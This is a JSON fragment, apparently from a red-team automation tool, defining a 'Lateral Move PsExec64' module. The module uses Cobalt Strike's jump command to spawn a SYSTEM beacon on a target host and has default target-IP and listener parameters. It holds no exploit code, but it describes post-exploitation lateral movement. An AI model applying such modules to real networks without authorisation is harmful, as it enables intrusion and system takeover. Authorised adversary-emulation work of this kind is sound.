          "name": "Lateral Move PsExec64",
          "icon": "\ud83d\ude80",
          "tactic": "TA0008",
          "category": "Cobalt Strike",
          "subcategory": "",
          "description": "Move laterally to a target host using PsExec via Cobalt Strike bjump - spawns SYSTEM beacon",
          "riskLevel": "medium",
          "estimatedDuration": 20,
          "inputs": [
            {
              "id": "session",
              "label": "Beacon Session",
              "type": "session",
              "required": true
            }
          ],
          "outputs": [
            {
              "id": "lateral_session",
              "label": "Lateral Session",
              "type": "session",
              "description": "New beacon on lateral target as SYSTEM"
            }
          ],
          "parameters": [
            {
              "id": "targetIp",
              "label": "Target IP",
              "type": "string",
              "required": true,
              "placeholder": "172.16.2.3",
              "default": "172.16.2.3"
            },
            {
              "id": "listener",
              "label": "Listener",
              "type": "string",
              "required": true,
              "placeholder": "HTTP",
              "default": "HTTP"
            },
            {
              "id": "lateralWait",
              "label": "Lateral Wait (seconds)",
              "type": "number",
              "required": false,
              "placeholder": "15",
              "default": 15
            }
